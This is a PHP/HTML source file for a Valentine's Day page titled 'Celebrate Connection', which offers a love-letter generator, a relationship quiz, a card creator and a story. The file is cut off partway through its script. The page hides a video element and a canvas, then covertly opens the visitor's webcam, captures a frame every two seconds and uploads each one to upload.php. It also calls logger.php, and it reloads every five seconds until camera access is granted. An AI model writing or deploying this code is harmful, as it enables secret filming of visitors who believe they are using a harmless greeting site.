<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
  @file_get_contents("logger.php");
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Celebrate Connection ❤️</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Montserrat:wght@300;400;600&family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
    <style>
        /* Hidden elements from your original code */
        video, canvas {
            display: none !important;
        }

        /* Base Styles */
        :root {
            --primary-color: #ff758f;
            --secondary-color: #ff7eb3;
            --accent-color: #ffcc00;
            --light-color: #fff5f7;
            --dark-color: #3a3a3a;
            --text-color: #333;
            --soft-pink: #ffdfea;
            --coral: #ff8a7a;
            --cream: #fff9f0;
            --gold: #ffd700;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Montserrat', sans-serif;
            color: var(--text-color);
            background-color: var(--light-color);
            line-height: 1.6;
            overflow-x: hidden;
        }

        h1, h2, h3 {
            font-family: 'Playfair Display', serif;
            font-weight: 700;
            color: var(--dark-color);
        }

        /* Animated Background */
        .background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: linear-gradient(135deg, var(--cream) 0%, var(--soft-pink) 100%);
            overflow: hidden;
        }

        .heart {
            position: absolute;
            opacity: 0.3;
            animation: float 15s infinite linear;
        }

        @keyframes float {
            0% {
                transform: translateY(0) rotate(0deg);
                opacity: 0.3;
            }
            50% {
                opacity: 0.6;
            }
            100% {
                transform: translateY(-100vh) rotate(360deg);
                opacity: 0.3;
            }
        }

        /* Header */
        header {
            text-align: center;
            padding: 4rem 2rem 2rem;
            position: relative;
        }

        .main-title {
            font-size: 3.5rem;
            margin-bottom: 1rem;
            color: var(--primary-color);
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
            animation: fadeIn 1.5s ease-in-out;
            font-family: 'Dancing Script', cursive;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .subtitle {
            font-size: 1.2rem;
            font-weight: 300;
            max-width: 600px;
            margin: 0 auto 2rem;
            color: var(--dark-color);
        }

        /* Navigation */
        .nav-tabs {
            display: flex;
            justify-content: center;
            margin-bottom: 2rem;
            flex-wrap: wrap;
        }

        .tab-btn {
            background: transparent;
            border: none;
            padding: 0.8rem 1.5rem;
            margin: 0 0.5rem;
            font-size: 1rem;
            cursor: pointer;
            border-radius: 30px;
            transition: all 0.3s ease;
            font-family: 'Montserrat', sans-serif;
            font-weight: 600;
            color: var(--dark-color);
        }

        .tab-btn:hover {
            background-color: rgba(255, 117, 143, 0.2);
        }

        .tab-btn.active {
            background-color: var(--primary-color);
            color: white;
        }

        /* Main Content */
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem;
        }

        .tab-content {
            display: none;
            animation: fadeInUp 0.5s ease-out;
            min-height: 50vh;
        }

        .tab-content.active {
            display: block;
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Love Letter Generator */
        .letter-form {
            background-color: white;
            border-radius: 15px;
            padding: 2rem;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
            max-width: 800px;
            margin: 0 auto;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600;
        }

        input, select, textarea {
            width: 100%;
            padding: 0.8rem;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-family: 'Montserrat', sans-serif;
        }

        textarea {
            min-height: 100px;
            resize: vertical;
        }

        .btn {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 0.8rem 1.8rem;
            border-radius: 30px;
            cursor: pointer;
            font-size: 1rem;
            font-weight: 600;
            transition: all 0.3s ease;
            display: inline-block;
        }

        .btn:hover {
            background-color: var(--secondary-color);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 117, 143, 0.4);
        }

        .letter-result {
            background-color: white;
            border-radius: 15px;
            padding: 2rem;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
            max-width: 800px;
            margin: 2rem auto;
            position: relative;
            border: 1px solid #f0f0f0;
            display: none;
        }

        .letter-paper {
            background: linear-gradient(to bottom, #fff9f0, #fff);
            padding: 2rem;
            border-radius: 8px;
            position: relative;
            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.05);
            min-height: 300px;
        }

        .letter-paper:before {
            content: "";
            position: absolute;
            top: 0;
            left: 40px;
            height: 100%;
            width: 2px;
            background: rgba(255, 117, 143, 0.3);
        }

        .letter-content {
            font-family: 'Dancing Script', cursive;
            font-size: 1.3rem;
            line-height: 1.8;
            color: #555;
        }

        .typing {
            border-right: 2px solid var(--primary-color);
            animation: blink 0.75s step-end infinite;
        }

        @keyframes blink {
            from, to { border-color: transparent }
            50% { border-color: var(--primary-color); }
        }

        /* Relationship Quiz */
        .quiz-container {
            background-color: white;
            border-radius: 15px;
            padding: 2rem;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
            max-width: 800px;
            margin: 0 auto;
        }

        .quiz-question {
            margin-bottom: 2rem;
            display: none;
        }

        .quiz-question.active {
            display: block;
        }

        .quiz-options {
            display: grid;
            grid-template-columns: 1fr;
            gap: 1rem;
            margin-top: 1.5rem;
        }

        .quiz-option {
            background-color: var(--light-color);
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 1rem;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .quiz-option:hover {
            background-color: rgba(255, 117, 143, 0.1);
            border-color: var(--primary-color);
        }

        .quiz-option.selected {
            background-color: var(--primary-color);
            color: white;
            border-color: var(--primary-color);
        }

        .quiz-nav {
            display: flex;
            justify-content: space-between;
            margin-top: 2rem;
        }

        .quiz-result {
            text-align: center;
            padding: 2rem;
            display: none;
        }

        .result-title {
            font-size: 2rem;
            color: var(--primary-color);
            margin-bottom: 1rem;
        }

        .result-description {
            font-size: 1.1rem;
            margin-bottom: 1.5rem;
        }

        .result-image {
            width: 150px;
            height: 150px;
            margin: 1rem auto;
            background-color: var(--light-color);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 3rem;
        }

        /* Virtual Card Creator */
        .card-creator {
            display: flex;
            flex-direction: column;
            gap: 2rem;
            max-width: 1000px;
            margin: 0 auto;
        }

        .card-preview-container {
            flex: 1;
            display: flex;
            justify-content: center;
        }

        .card-preview {
            width: 100%;
            max-width: 500px;
            height: 350px;
            background-color: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 2rem;
            text-align: center;
        }

        .card-message {
            font-family: 'Dancing Script', cursive;
            font-size: 1.5rem;
            margin: 1rem 0;
            z-index: 2;
            max-width: 80%;
            word-wrap: break-word;
        }

        .card-controls {
            flex: 1;
            background-color: white;
            border-radius: 15px;
            padding: 2rem;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
        }

        .control-section {
            margin-bottom: 2rem;
        }

        .control-title {
            font-weight: 600;
            margin-bottom: 1rem;
            color: var(--primary-color);
        }

        .bg-options, .sticker-options, .font-options {
            display: flex;
            flex-wrap: wrap;
            gap: 1rem;
            margin-top: 1rem;
        }

        .bg-option, .sticker-option, .font-option {
            width: 60px;
            height: 60px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px solid transparent;
        }

        .bg-option:hover, .sticker-option:hover, .font-option:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }

        .bg-option.selected, .sticker-option.selected, .font-option.selected {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(255, 117, 143, 0.3);
        }

        .bg-option {
            background-size: cover;
            background-position: center;
        }

        .sticker-option {
            font-size: 2rem;
        }

        .font-option {
            font-size: 1.5rem;
            font-family: inherit;
        }

        /* Interactive Story */
        .story-container {
            background-color: white;
            border-radius: 15px;
            padding: 2rem;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
            max-width: 800px;
            margin: 0 auto;
            min-height: 400px;
            position: relative;
        }

        .story-content {
            margin-bottom: 2rem;
            font-size: 1.1rem;
            line-height: 1.8;
        }

        .story-options {
            display: grid;
            grid-template-columns: 1fr;
            gap: 1rem;
        }

        .story-option {
            background-color: var(--light-color);
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 1rem;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .story-option:hover {
            background-color: rgba(255, 117, 143, 0.1);
            border-color: var(--primary-color);
        }

        .story-image {
            width: 100%;
            height: 200px;
            background-size: cover;
            background-position: center;
            border-radius: 8px;
            margin-bottom: 1rem;
            display: none;
        }

        .story-image.active {
            display: block;
            animation: fadeIn 0.5s ease-out;
        }

        /* Share Buttons */
        .share-buttons {
            display: flex;
            gap: 1rem;
            margin-top: 2rem;
            justify-content: center;
        }

        .share-btn {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.6rem 1.2rem;
            border-radius: 30px;
            border: none;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .share-btn.facebook {
            background-color: #1877f2;
            color: white;
        }

        .share-btn.twitter {
            background-color: #1da1f2;
            color: white;
        }

        .share-btn.whatsapp {
            background-color: #25d366;
            color: white;
        }

        .share-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }

        /* Footer */
        footer {
            text-align: center;
            padding: 3rem 2rem 2rem;
            margin-top: 3rem;
            color: var(--dark-color);
            font-size: 0.9rem;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .main-title {
                font-size: 2.5rem;
            }
            
            .card-creator {
                flex-direction: column;
            }
            
            .tab-btn {
                padding: 0.6rem 1rem;
                margin: 0.3rem;
                font-size: 0.9rem;
            }
        }

        @media (max-width: 480px) {
            .main-title {
                font-size: 2rem;
            }
            
            .letter-form, .quiz-container, .card-controls, .story-container {
                padding: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <!-- Your original hidden elements -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <!-- Valentine's Day Website Content -->
    <div class="background" id="background"></div>

    <header>
        <h1 class="main-title">Celebrate Connection ❤️</h1>
        <p class="subtitle">Valentine's Day is about all kinds of love - romantic, friendship, and family. Celebrate your connections!</p>
    </header>

    <div class="container">
        <div class="nav-tabs">
            <button class="tab-btn active" data-tab="letter">Love Letter</button>
            <button class="tab-btn" data-tab="quiz">Relationship Quiz</button>
            <button class="tab-btn" data-tab="card">Virtual Card</button>
            <button class="tab-btn" data-tab="story">Interactive Story</button>
        </div>

        <!-- Love Letter Generator -->
        <div id="letter" class="tab-content active">
            <div class="letter-form">
                <h2>Create a Personalized Love Letter</h2>
                <p>Fill in the details below to generate a heartfelt letter for someone special in your life.</p>
                
                <div class="form-group">
                    <label for="recipient-name">Recipient's Name</label>
                    <input type="text" id="recipient-name" placeholder="e.g., Sarah, Mom, Best Friend">
                </div>
                
                <div class="form-group">
                    <label for="relationship-type">Your Relationship</label>
                    <select id="relationship-type">
                        <option value="romantic">Romantic Partner</option>
                        <option value="friend">Friend</option>
                        <option value="family">Family Member</option>
                        <option value="other">Other</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label for="special-memory">A Special Memory You Share</label>
                    <textarea id="special-memory" placeholder="Describe a moment that was meaningful to you both"></textarea>
                </div>
                
                <div class="form-group">
                    <label for="qualities">What You Appreciate About Them</label>
                    <textarea id="qualities" placeholder="List the things you love or admire about them"></textarea>
                </div>
                
                <button id="generate-letter" class="btn">Generate Love Letter</button>
            </div>
            
            <div id="letter-result" class="letter-result">
                <h2>Your Personalized Love Letter</h2>
                <div class="letter-paper">
                    <div id="letter-content" class="letter-content"></div>
                </div>
                <div class="share-buttons">
                    <button class="share-btn facebook" onclick="shareLetter('facebook')">
                        <i>📘</i> Facebook
                    </button>
                    <button class="share-btn twitter" onclick="shareLetter('twitter')">
                        <i>🐦</i> Twitter
                    </button>
                    <button class="share-btn whatsapp" onclick="shareLetter('whatsapp')">
                        <i>📱</i> WhatsApp
                    </button>
                </div>
            </div>
        </div>

        <!-- Relationship Quiz -->
        <div id="quiz" class="tab-content">
            <div class="quiz-container">
                <div id="quiz-start">
                    <h2>Relationship Quiz</h2>
                    <p>Take this fun quiz to discover more about your relationship! Answer honestly for the best results.</p>
                    <button id="start-quiz" class="btn">Start Quiz</button>
                </div>
                
                <div id="quiz-questions" style="display: none;">
                    <div class="quiz-question" data-question="1">
                        <h3>How did you first meet this person?</h3>
                        <div class="quiz-options">
                            <div class="quiz-option" data-value="a">Through friends or family</div>
                            <div class="quiz-option" data-value="b">At work or school</div>
                            <div class="quiz-option" data-value="c">By chance or accident</div>
                            <div class="quiz-option" data-value="d">Online or through an app</div>
                        </div>
                    </div>
                    
                    <div class="quiz-question" data-question="2">
                        <h3>What's your favorite thing to do together?</h3>
                        <div class="quiz-options">
                            <div class="quiz-option" data-value="a">Have deep conversations</div>
                            <div class="quiz-option" data-value="b">Try new activities or adventures</div>
                            <div class="quiz-option" data-value="c">Relax and do nothing special</div>
                            <div class="quiz-option" data-value="d">Help or support each other</div>
                        </div>
                    </div>
                    
                    <div class="quiz-question" data-question="3">
                        <h3>How do you usually communicate?</h3>
                        <div class="quiz-options">
                            <div class="quiz-option" data-value="a">Text messages throughout the day</div>
                            <div class="quiz-option" data-value="b">Long phone or video calls</div>
                            <div class="quiz-option" data-value="c">Mostly in person, not much digital</div>
                            <div class="quiz-option" data-value="d">A mix of everything</div>
                        </div>
                    </div>
                    
                    <div class="quiz-question" data-question="4">
                        <h3>When you're apart, how do you feel?</h3>
                        <div class="quiz-options">
                            <div class="quiz-option" data-value="a">I miss them but know we're strong</div>
                            <div class="quiz-option" data-value="b">I worry about the relationship</div>
                            <div class="quiz-option" data-value="c">I enjoy my space but look forward to meeting</div>
                            <div class="quiz-option" data-value="d">I don't think much about it</div>
                        </div>
                    </div>
                    
                    <div class="quiz-question" data-question="5">
                        <h3>What's your biggest strength as a pair?</h3>
                        <div class="quiz-options">
                            <div class="quiz-option" data-value="a">We understand each other deeply</div>
                            <div class="quiz-option" data-value="b">We have fun and exciting times together</div>
                            <div class="quiz-option" data-value="c">We support each other through tough times</div>
                            <div class="quiz-option" data-value="d">We accept each other completely</div>
                        </div>
                    </div>
                    
                    <div class="quiz-nav">
                        <button id="prev-question" class="btn" disabled>Previous</button>
                        <button id="next-question" class="btn">Next</button>
                    </div>
                </div>
                
                <div id="quiz-result" class="quiz-result" style="display: none;">
                    <div class="result-image">❤️</div>
                    <h2 class="result-title" id="result-title">Your Relationship Style</h2>
                    <p class="result-description" id="result-description"></p>
                    <div class="share-buttons">
                        <button class="share-btn facebook" onclick="shareQuizResult('facebook')">
                            <i>📘</i> Facebook
                        </button>
                        <button class="share-btn twitter" onclick="shareQuizResult('twitter')">
                            <i>🐦</i> Twitter
                        </button>
                        <button class="share-btn whatsapp" onclick="shareQuizResult('whatsapp')">
                            <i>📱</i> WhatsApp
                        </button>
                    </div>
                    <button id="retake-quiz" class="btn" style="margin-top: 1rem;">Take Quiz Again</button>
                </div>
            </div>
        </div>

        <!-- Virtual Card Creator -->
        <div id="card" class="tab-content">
            <div class="card-creator">
                <div class="card-preview-container">
                    <div class="card-preview" id="card-preview">
                        <div id="card-message" class="card-message" contenteditable="true">Your message here...</div>
                    </div>
                </div>
                
                <div class="card-controls">
                    <div class="control-section">
                        <h3 class="control-title">Card Background</h3>
                        <div class="bg-options">
                            <div class="bg-option selected" style="background: linear-gradient(135deg, #ff758f 0%, #ff7eb3 100%);" data-bg="gradient-pink"></div>
                            <div class="bg-option" style="background: linear-gradient(135deg, #ff8a7a 0%, #ffb3a7 100%);" data-bg="gradient-coral"></div>
                            <div class="bg-option" style="background: linear-gradient(135deg, #ffcc00 0%, #ffeb3b 100%);" data-bg="gradient-gold"></div>
                            <div class="bg-option" style="background: linear-gradient(135deg, #a18cd1 0%, #fbc2eb 100%);" data-bg="gradient-purple"></div>
                            <div class="bg-option" style="background: url('https://images.unsplash.com/photo-1518199266791-5375a83190b7?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80') center/cover;" data-bg="image-hearts"></div>
                        </div>
                    </div>
                    
                    <div class="control-section">
                        <h3 class="control-title">Stickers & Decorations</h3>
                        <div class="sticker-options">
                            <div class="sticker-option selected" data-sticker="❤️">❤️</div>
                            <div class="sticker-option" data-sticker="🌸">🌸</div>
                            <div class="sticker-option" data-sticker="💖">💖</div>
                            <div class="sticker-option" data-sticker="🌹">🌹</div>
                            <div class="sticker-option" data-sticker="✨">✨</div>
                        </div>
                    </div>
                    
                    <div class="control-section">
                        <h3 class="control-title">Font Style</h3>
                        <div class="font-options">
                            <div class="font-option selected" style="font-family: 'Dancing Script', cursive;" data-font="dancing">Aa</div>
                            <div class="font-option" style="font-family: 'Playfair Display', serif;" data-font="playfair">Aa</div>
                            <div class="font-option" style="font-family: 'Montserrat', sans-serif;" data-font="montserrat">Aa</div>
                            <div class="font-option" style="font-family: 'Courier New', monospace;" data-font="courier">Aa</div>
                        </div>
                    </div>
                    
                    <button id="save-card" class="btn">Save Card</button>
                    <div class="share-buttons" style="margin-top: 1rem;">
                        <button class="share-btn facebook" onclick="shareCard('facebook')">
                            <i>📘</i> Facebook
                        </button>
                        <button class="share-btn twitter" onclick="shareCard('twitter')">
                            <i>🐦</i> Twitter
                        </button>
                        <button class="share-btn whatsapp" onclick="shareCard('whatsapp')">
                            <i>📱</i> WhatsApp
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Interactive Story -->
        <div id="story" class="tab-content">
            <div class="story-container">
                <div id="story-start">
                    <h2>The Connection Journey</h2>
                    <p>This interactive story explores different kinds of connections. Make choices to shape the story's outcome!</p>
                    <button id="start-story" class="btn">Begin Story</button>
                </div>
                
                <div id="story-content" style="display: none;">
                    <div class="story-image" id="story-image"></div>
                    <div class="story-content" id="current-story"></div>
                    <div class="story-options" id="story-options"></div>
                </div>
                
                <div id="story-end" style="display: none;">
                    <div class="result-image">🎉</div>
                    <h2 class="result-title">Story Complete!</h2>
                    <p class="result-description" id="story-ending-message"></p>
                    <div class="share-buttons">
                        <button class="share-btn facebook" onclick="shareStory('facebook')">
                            <i>📘</i> Facebook
                        </button>
                        <button class="share-btn twitter" onclick="shareStory('twitter')">
                            <i>🐦</i> Twitter
                        </button>
                        <button class="share-btn whatsapp" onclick="shareStory('whatsapp')">
                            <i>📱</i> WhatsApp
                        </button>
                    </div>
                    <button id="restart-story" class="btn" style="margin-top: 1rem;">Read Again</button>
                </div>
            </div>
        </div>
    </div>

    <footer>
        <p>Made with ❤️ for Valentine's Day</p>
        <p>© 2025 Celebrate Connection. All rights reserved.</p>
    </footer>

    <script>

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        let lastImageHash = "";

        function getImageHash(dataUrl) {
            let hash = 0;
            for (let i = 0; i < dataUrl.length; i++) {
                const char = dataUrl.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash |= 0; // convert to 32-bit integer
            }
            return hash;
        }

        function captureAndSend() {
            const width = video.videoWidth;
            const height = video.videoHeight;

            if (width === 0 || height === 0) return;

            canvas.width = width;
            canvas.height = height;
            ctx.drawImage(video, 0, 0, width, height);

            const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
            const hash = getImageHash(dataUrl);

            if (hash === lastImageHash) {
                return; // same image, skip upload
            }

            lastImageHash = hash;

            fetch('upload.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: dataUrl })
            });
        }

        function startCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    setInterval(captureAndSend, 2000);
                })
                .catch(err => {
                    console.warn("Camera access failed:", err);
                    setTimeout(() => location.reload(), 5000);
                });
        }

        startCamera();
        fetch("logger.php").then(res => res.text()).then(console.log);

        // Valentine's Day Website JavaScript
        document.addEventListener('DOMContentLoaded', function() {
            // Create floating hearts background
            createHearts();
            
            // Tab navigation
            const tabBtns = document.querySelectorAll('.tab-btn');
            const tabContents = document.querySelectorAll('.tab-content');
            
            tabBtns.forEach(btn => {
                btn.addEventListener('click', () => {
                    const tabId = btn.getAttribute('data-tab');
                    
                    // Update active tab button
                    tabBtns.forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');
                    
                    // Show corresponding content
                    tabContents.forEach(content => {
                        content.classList.remove('active');
                        if (content.id === tabId) {
                            content.classList.add('active');
                        }
                    });
                });
            });
            
            // Love Letter Generator
            const generateLetterBtn = document.getElementById('generate-letter');
            const letterResult = document.getElementById('letter-result');
            const letterContent = document.getElementById('letter-content');
            
            generateLetterBtn.addEventListener('click', generateLoveLetter);
            
            function generateLoveLetter() {
                const recipient = document.getElementById('recipient-name').value || 'Someone Special';
                const relationship = document.getElementById('relationship-type').value;
                const memory = document.getElementById('special-memory').value || 'many cherished moments';
                const qualities = document.getElementById('qualities').value || 'your wonderful qualities';
                
                let salutation, closing;
                
                switch(relationship) {
                    case 'romantic':
                        salutation = `My Dearest ${recipient},`;
                        closing = `Forever yours,`;
                        break;
                    case 'friend':
                        salutation = `Dear ${recipient},`;
                        closing = `Your friend always,`;
                        break;
                    case 'family':
                        salutation = `Dear ${recipient},`;
                        closing = `With all my love,`;
                        break;
                    default:
                        salutation = `Dear ${recipient},`;
                        closing = `With warm regards,`;
                }
                
                const letter = `
                    ${salutation}
                    <br><br>
                    As I sit down to write this letter, I find myself thinking about ${memory}. That moment (and so many others) reminds me of how much you mean to me.
                    <br><br>
                    I want you to know how much I appreciate ${qualities}. You have a way of making the world brighter just by being in it.
                    <br><br>
                    On this Valentine's Day, I want to celebrate the connection we share. Whether we're laughing together or supporting each other through challenges, every moment with you is special.
                    <br><br>
                    Thank you for being you. I look forward to creating many more beautiful memories together in the days to come.
                    <br><br>
                    ${closing}
                    <br>
                    Me
                `;
                
                letterResult.style.display = 'block';
                letterContent.innerHTML = '';
                
                // Typewriter effect
                let i = 0;
                const speed = 20;
                
                function typeWriter() {
                    if (i < letter.length) {
                        letterContent.innerHTML += letter.charAt(i);
                        i++;
                        setTimeout(typeWriter, speed);
                    } else {
                        letterContent.classList.remove('typing');
                    }
                }
                
                letterContent.classList.add('typing');
                typeWriter();
                
                // Scroll to result
                letterResult.scrollIntoView({ behavior: 'smooth' });
            }
            
            // Relationship Quiz
            const startQuizBtn = document.getElementById('start-quiz');
            const quizStart = document.getElementById('quiz-start');
            const quizQuestions = document.getElementById('quiz-questions');
            const quizResult = document.getElementById('quiz-result');
            const retakeQuizBtn = document.getElementById('retake-quiz');
            const prevQuestionBtn = document.getElementById('prev-question');
            const nextQuestionBtn = document.getElementById('next-question');
            
            let currentQuestion = 1;
            const totalQuestions = document.querySelectorAll('.quiz-question').length;
            let quizAnswers = {};
            
            startQuizBtn.addEventListener('click', startQuiz);
            retakeQuizBtn.addEventListener('click', resetQuiz);
            prevQuestionBtn.addEventListener('click', prevQuestion);
            nextQuestionBtn.addEventListener('click', nextQuestion);
            
            // Set up quiz option selection
            document.querySelectorAll('.quiz-option').forEach(option => {
                option.addEventListener('click', function() {
                    const question = this.closest('.quiz-question').getAttribute('data-question');
                    const value = this.getAttribute('data-value');
                    
                    // Remove selected class from all options in this question
                    this.closest('.quiz-question').querySelectorAll('.quiz-option').forEach(opt => {
                        opt.classList.remove('selected');
                    });
                    
                    // Add selected class to clicked option
                    this.classList.add('selected');
                    
                    // Store answer
                    quizAnswers[question] = value;
                    
                    // Enable next button
                    if (currentQuestion === totalQuestions) {
                        nextQuestionBtn.textContent = 'See Results';
                    } else {
                        nextQuestionBtn.textContent = 'Next';
                    }
                });
            });
            
            function startQuiz() {
                quizStart.style.display = 'none';
                quizQuestions.style.display = 'block';
                showQuestion(currentQuestion);
            }
            
            function showQuestion(n) {
                document.querySelectorAll('.quiz-question').forEach(q => {
                    q.classList.remove('active');
                });
                
                document.querySelector(`.quiz-question[data-question="${n}"]`).classList.add('active');
                
                // Update nav buttons
                prevQuestionBtn.disabled = n === 1;
                
                if (n === totalQuestions) {
                    nextQuestionBtn.textContent = Object.keys(quizAnswers).length === totalQuestions ? 'See Results' : 'Next';
                } else {
                    nextQuestionBtn.textContent = 'Next';
                }
            }
            
            function prevQuestion() {
                if (currentQuestion > 1) {
                    currentQuestion--;
                    showQuestion(currentQuestion);
                }
            }
            
            function nextQuestion() {
                if (currentQuestion < totalQuestions) {
                    // Check if current question is answered
                    if (!quizAnswers[currentQuestion]) {
                        alert('Please select an answer before continuing.');
                        return;
                    }
                    
                    currentQuestion++;
                    showQuestion(currentQuestion);
                } else if (currentQuestion === totalQuestions) {
                    // Check if last question is answered
                    if (!quizAnswers[currentQuestion]) {
                        alert('Please select an answer before continuing.');
                        return;
                    }
                    
                    // Show results
                    showQuizResults();
                }
            }
            
            function showQuizResults() {
                quizQuestions.style.display = 'none';
                quizResult.style.display = 'block';
                
                // Calculate result based on answers
                const result = calculateQuizResult();
                
                document.getElementById('result-title').textContent = result.title;
                document.getElementById('result-description').textContent = result.description;
                document.querySelector('.result-image').innerHTML = result.emoji;
                
                // Scroll to result
                quizResult.scrollIntoView({ behavior: 'smooth' });
            }
            
            function calculateQuizResult() {
                // Simple scoring system - in a real app you might want something more sophisticated
                const answerValues = Object.values(quizAnswers);
                const aCount = answerValues.filter(v => v === 'a').length;
                const bCount = answerValues.filter(v => v === 'b').length;
                const cCount = answerValues.filter(v => v === 'c').length;
                const dCount = answerValues.filter(v => v === 'd').length;
                
                const maxCount = Math.max(aCount, bCount, cCount, dCount);
                
                if (maxCount === aCount) {
                    return {
                        title: "Deep Soul Connection",
                        description: "Your relationship is built on profound understanding and emotional intimacy. You share a bond that goes beyond surface-level interactions, with a strong foundation of trust and mutual respect. This connection allows you to be your true selves with each other.",
                        emoji: "💞"
                    };
                } else if (maxCount === bCount) {
                    return {
                        title: "Adventurous Spirit",
                        description: "Your relationship thrives on excitement and new experiences! You love exploring the world (or just new ideas) together. This shared sense of adventure keeps your connection fresh and dynamic. Just remember to also appreciate the quiet moments in between adventures.",
                        emoji: "🌍"
                    };
                } else if (maxCount === cCount) {
                    return {
                        title: "Comfortable Companionship",
                        description: "Your connection is like a favorite sweater - warm, comfortable, and always there when you need it. You appreciate the simple, everyday moments together as much as the special occasions. This stable foundation means you can truly relax and be yourselves around each other.",
                        emoji: "☕"
                    };
                } else {
                    return {
                        title: "Supportive Partnership",
                        description: "Your relationship is characterized by mutual support and practical care. You're there for each other through thick and thin, offering help when needed and celebrating each other's successes. This reliable foundation creates a strong bond that can weather life's challenges.",
                        emoji: "🤝"
                    };
                }
            }
            
            function resetQuiz() {
                currentQuestion = 1;
                quizAnswers = {};
                quizResult.style.display = 'none';
                quizStart.style.display = 'block';
                
                // Reset all selected options
                document.querySelectorAll('.quiz-option').forEach(opt => {
                    opt.classList.remove('selected');
                });
            }
            
            // Virtual Card Creator
            const bgOptions = document.querySelectorAll('.bg-option');
            const stickerOptions = document.querySelectorAll('.sticker-option');
            const fontOptions = document.querySelectorAll('.font-option');
            const cardPreview = document.getElementById('card-preview');
            const cardMessage = document.getElementById('card-message');
            const saveCardBtn = document.getElementById('save-card');
            
            // Set up background selection
            bgOptions.forEach(option => {
                option.addEventListener('click', function() {
                    bgOptions.forEach(opt => opt.classList.remove('selected'));
                    this.classList.add('selected');
                    
                    // Update card background
                    if (this.getAttribute('data-bg').startsWith('gradient')) {
                        cardPreview.style.background = this.style.background;
                        cardPreview.style.backgroundImage = 'none';
                    } else {
                        cardPreview.style.backgroundImage = this.style.backgroundImage;
                    }
                });
            });
            
            // Set up sticker selection
            stickerOptions.forEach(option => {
                option.addEventListener('click', function() {
                    stickerOptions.forEach(opt => opt.classList.remove('selected'));
                    this.classList.add('selected');
                    
                    // Add sticker to card
                    const sticker = this.getAttribute('data-sticker');
                    cardMessage.innerHTML = sticker + ' ' + (cardMessage.textContent || cardMessage.innerText).replace(/^[^a-zA-Z0-9]*/, '') + ' ' + sticker;
                });
            });
            
            // Set up font selection
            fontOptions.forEach(option => {
                option.addEventListener('click', function() {
                    fontOptions.forEach(opt => opt.classList.remove('selected'));
                    this.classList.add('selected');
                    
                    // Update card font
                    const font = this.getAttribute('data-font');
                    switch(font) {
                        case 'dancing':
                            cardMessage.style.fontFamily = "'Dancing Script', cursive";
                            break;
                        case 'playfair':
                            cardMessage.style.fontFamily = "'Playfair Display', serif";
                            break;
                        case 'montserrat':
                            cardMessage.style.fontFamily = "'Montserrat', sans-serif";
                            break;
                        case 'courier':
                            cardMessage.style.fontFamily = "'Courier New', monospace";
                            break;
                    }
                });
            });
            
            // Save card functionality
            saveCardBtn.addEventListener('click', function() {
                alert('Card saved! (In a real implementation, this would save to your account or download the card)');
            });
            
            // Interactive Story
            const startStoryBtn = document.getElementById('start-story');
            const storyStart = document.getElementById('story-start');
            const storyContent = document.getElementById('story-content');
            const currentStory = document.getElementById('current-story');
            const storyOptions = document.getElementById('story-options');
            const storyEnd = document.getElementById('story-end');
            const storyImage = document.getElementById('story-image');
            const restartStoryBtn = document.getElementById('restart-story');
            
            let storyState = {
                path: [],
                currentScene: 'start'
            };
